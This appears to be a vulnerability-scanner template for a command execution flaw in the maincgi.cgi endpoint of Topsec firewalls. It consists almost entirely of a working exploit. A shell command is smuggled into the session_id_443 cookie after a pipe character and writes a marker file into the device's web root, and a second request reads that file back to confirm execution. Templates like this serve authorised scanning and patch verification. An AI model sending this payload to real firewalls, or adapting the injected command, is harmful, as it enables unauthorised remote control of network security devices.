id: topsec-cookie-rce

info:
  name: 天融信防火墙maincgi命令执行漏洞
  author: topsec
  severity: critical
  tags: topsec

http:
  - raw:
      - |+
        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: session_id_443=1|echo sectest2026 > /www/htdocs/site/image/sectest.txt
        
      - |+
        GET /site/image/sectest.txt HTTP/1.1
        Host: {{Hostname}}     

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "sectest2026"
        part: body_2
